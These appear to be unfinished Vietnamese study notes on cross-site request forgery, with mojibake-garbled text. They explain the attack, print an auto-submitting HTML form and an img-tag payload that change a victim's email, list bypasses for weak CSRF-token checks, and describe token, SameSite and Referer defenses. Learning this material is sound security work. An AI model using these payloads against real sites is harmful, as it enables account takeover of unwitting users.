# Cross-Site Request Forgery (CSRF)

- Cross-site = tá»« trang web khÃ¡c
- Request = gá»­i yÃªu cáº§u
- Forgery = giáº£ máº¡o
## 1. KhÃ¡i niá»‡m
**Cross-Site Request Forgery (CSRF)** = Ã©p browser cá»§a náº¡n nhÃ¢n tá»± gá»­i yÃªu cáº§u Ä‘áº¿n má»™t website mÃ  náº¡n nhÃ¢n Ä‘ang Ä‘Äƒng nháº­p, mÃ  há» khÃ´ng há» biáº¿t.

Báº£n cháº¥t:
- Browser *tá»± Ä‘á»™ng gá»­i cookie session* cho website má»—i khi cÃ³ request Ä‘áº¿n Ä‘Ãºng domain.
- Náº¿u náº¡n nhÃ¢n Ä‘ang Ä‘Äƒng nháº­p = *cookie chÆ°a háº¿t háº¡n*, hacker cÃ³ thá»ƒ Ã©p browser cá»§a náº¡n nhÃ¢n gá»­i request Ä‘áº¿n website Ä‘Ã³.
- Server nhÃ¬n tháº¥y cookie trong request vÃ  *tÆ°á»Ÿng request Ä‘Ã³ lÃ  cá»§a náº¡n nhÃ¢n*.

=> VÃ¬ váº­y, CSRF khÃ´ng Ä‘Ã¡nh cáº¯p cookie, mÃ  dÃ¹ng cookie há»£p lá»‡ cá»§a náº¡n nhÃ¢n Ä‘á»ƒ thá»±c hiá»‡n hÃ nh Ä‘á»™ng thay há».

## 2. Äiá»u kiá»‡n Ä‘á»ƒ CSRF xáº£y ra
- CÃ³ hÃ nh Ä‘á»™ng quan trá»ng (Ä‘á»•i email, Ä‘á»•i pass, chuyá»ƒn tiá»nâ€¦)
- XÃ¡c thá»±c dÃ¹ng cookie (trÃ¬nh duyá»‡t tá»± gá»­i cookie session)
- KhÃ´ng cÃ³ tham sá»‘ khÃ³ Ä‘oÃ¡n (khÃ´ng yÃªu cáº§u máº­t kháº©u cÅ©, khÃ´ng cÃ³ CSRF tokenâ€¦)

## 3. VÃ­ dá»¥ CSRF: Äá»•i email
**BÆ°á»›c 1:**

User gá»­i request login Ä‘áº¿n server `vulnerable-website.com`. <br>-> Server sáº½ gá»­i láº¡i cookie cho user, vÃ  browser cá»§a user sáº½ lÆ°u cookie cho cÃ¡c request sau.

**BÆ°á»›c 2:**

Khi user muá»‘n Ä‘á»•i email, user gá»­i request Ä‘á»•i email kÃ¨m cookie tá»›i server.
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
-> Server kiá»ƒm tra cookie vÃ  gá»­i láº¡i form HTML Ä‘á»•i email cho user.

**BÆ°á»›c 3:**
<p><b><i>Trong trÆ°á»ng há»£p khÃ´ng bá»‹ táº¥n cÃ´ng</i></b></p>

User Ä‘iá»n form, áº¥n submit Ä‘á»ƒ gá»­i request POST (+cookie) Ä‘áº¿n server.<br>->Server kiá»ƒm tra cookie há»£p lá»‡ vÃ  cho phÃ©p Ä‘á»•i email.

<p><b><i>Trong trÆ°á»ng há»£p bá»‹ táº¥n cÃ´ng</i></b></p>

Attacker táº¡o 1 form giáº£ Ä‘á»ƒ user truy cáº­p. Form nÃ y cÃ³ thá»ƒ cho user tá»± Ä‘iá»n, hoáº·c cÃ³ sáºµn data Ä‘á»ƒ khi user truy cáº­p thÃ¬ tá»± Ä‘á»™ng gá»­i Ä‘i ngay láº­p tá»©c.

```
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Giáº£i thÃ­ch:
- `<form action=".../email/change" method="POST">`: Ã‰p browser gá»­i request Ä‘áº¿n endpoint Ä‘á»•i email cá»§a website tháº­t.
- `<input type="hidden" name="email" value="pwned@evil-user.net">`: ChÃ¨n email mÃ  attacker muá»‘n thay tháº¿ cho email cá»§a náº¡n nhÃ¢n.
- `document.forms[0].submit();`: Tá»± Ä‘á»™ng gá»­i form ngay khi trang Ä‘Æ°á»£c má»Ÿ, khÃ´ng cáº§n thao tÃ¡c cá»§a ngÆ°á»i dÃ¹ng.

LÃºc nÃ y request Ä‘Æ°á»£c gá»­i Ä‘i dÆ°á»›i cookie cá»§a user.<br>Request trÃ´ng sáº½ giá»‘ng nhÆ°:
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=pwned@evil-user.net
```
-> Server kiá»ƒm tra váº«n Ä‘Ãºng cookie thÃ¬ cho Ä‘á»•i email

=> Táº¥n cÃ´ng thÃ nh cÃ´ng.

## 4. CSRF Deliver Methods
Attacker cÃ³ thá»ƒ:
- Gá»­i link qua email/messenger
- NhÃºng payload trong website há» kiá»ƒm soÃ¡t
- Äáº·t trong comment cá»§a 1 website khÃ´ng lá»c HTML
- Náº¿u action lÃ  GET, táº¥n cÃ´ng cÃ²n dá»… hÆ¡n:

VD: `<img src="https://vulnerable.com/email/change?email=pwned@evil-user.net">`

## 5. CÃ¡c biá»‡n phÃ¡p phÃ²ng chá»‘ng CSRF
### 5.1. CSRF Token
**Ã tÆ°á»Ÿng**: Trong form HTML server gá»­i cho user Ä‘á»ƒ Ä‘iá»n mail má»›i, Ä‘Ã­nh kÃ¨m thÃªm 1 token (chuá»—i ngáº«u nhiÃªn) Ä‘á»ƒ xÃ¡c minh.

**CÃ¡ch hoáº¡t Ä‘á»™ng**:

- Khi user gá»­i request Ä‘á»•i email, server gá»­i láº¡i 1 form HTML kÃ¨m CSRF token Ä‘á»ƒ user Ä‘iá»n.
- Náº¿u khÃ´ng bá»‹ táº¥n cÃ´ng, user gá»­i láº¡i request kÃ¨m form HTML + CSRF token. Server kiá»ƒm tra token Ä‘Ãºng vÃ  cho Ä‘á»•i email.
- Ká»ƒ cáº£ attacker cÃ³ táº¡o 1 form giáº£ Ä‘á»ƒ gá»­i request báº±ng cookie cá»§a user, form giáº£ nÃ y cÅ©ng khÃ´ng cÃ³ CSRF token.

### 5.2. SameSite Cookie
------------------------------------------------------------------------------CHÆ¯A XONG
TrÃ¬nh duyá»‡t khÃ´ng gá»­i cookie náº¿u request Ä‘Æ°á»£c gá»­i tá»« trang khÃ¡c.

Chrome máº·c Ä‘á»‹nh:

Set-Cookie: session=abc; SameSite=Lax;


â†’ CSRF gáº§n nhÆ° vÃ´ dá»¥ng vá»›i GET.

3. Kiá»ƒm tra Referer

Server chá»‰ cháº¥p nháº­n request Ä‘áº¿n tá»« Ä‘Ãºng domain.
(Yáº¿u hÆ¡n, vÃ¬ Ä‘Ã´i khi browser khÃ´ng gá»­i Referer.)

âš ï¸ CÃ¡c lá»—i cáº¥u hÃ¬nh CSRF token â†’ váº«n bá»‹ CSRF
âŒ 1. Token chá»‰ kiá»ƒm tra vá»›i POST

Attacker Ä‘á»•i sang GET Ä‘á»ƒ bypass.

Payload:

GET /email/change?email=pwned@evil.com

âŒ 2. Token bá»‹ bá» qua náº¿u thiáº¿u tham sá»‘

Má»™t sá»‘ web náº¿u khÃ´ng cÃ³ tham sá»‘ csrf=... thÃ¬â€¦ KHÃ”NG CHECK ğŸ¤¦â€â™‚ï¸

Payload bypass:

POST /email/change
email=pwned@evil.com

âŒ 3. Token khÃ´ng gáº¯n vá»›i session

Web chá»‰ kiá»ƒm tra â€œtoken cÃ³ tá»“n táº¡i trong há»‡ thá»‘ngâ€ â†’ Attacker dÃ¹ng token cá»§a chÃ­nh háº¯n.

âŒ 4. Token gáº¯n vÃ o cookie khÃ´ng pháº£i cookie session

Attacker chá»‰ cáº§n Ä‘áº·t cookie Ä‘Ã³ cho náº¡n nhÃ¢n (qua subdomain khÃ¡c).

âŒ 5. Double-Submit Cookie (token náº±m trong cookie vÃ  body)

Attacker chá»‰ cáº§n set cookie + gá»­i token trÃ¹ng khá»›p.

VÃ­ dá»¥ web yÃªu cáº§u:

Cookie: csrf=ABC123
csrf=ABC123


Attacker lÃ m:

Set cookie csrf=AAAAAA

Gá»­i request vá»›i csrf=AAAAAA

=> BYPASS.

ğŸ§° CÃ¡ch táº¡o CSRF exploit nhanh báº±ng Burp

Burp â†’ Chá»n request â†’ Right-click â†’ Generate CSRF PoC

Burp táº¡o HTML Ä‘áº§y Ä‘á»§ â†’ báº¡n chá»‰ cáº§n host lÃªn web vÃ  gá»­i cho náº¡n nhÃ¢n.
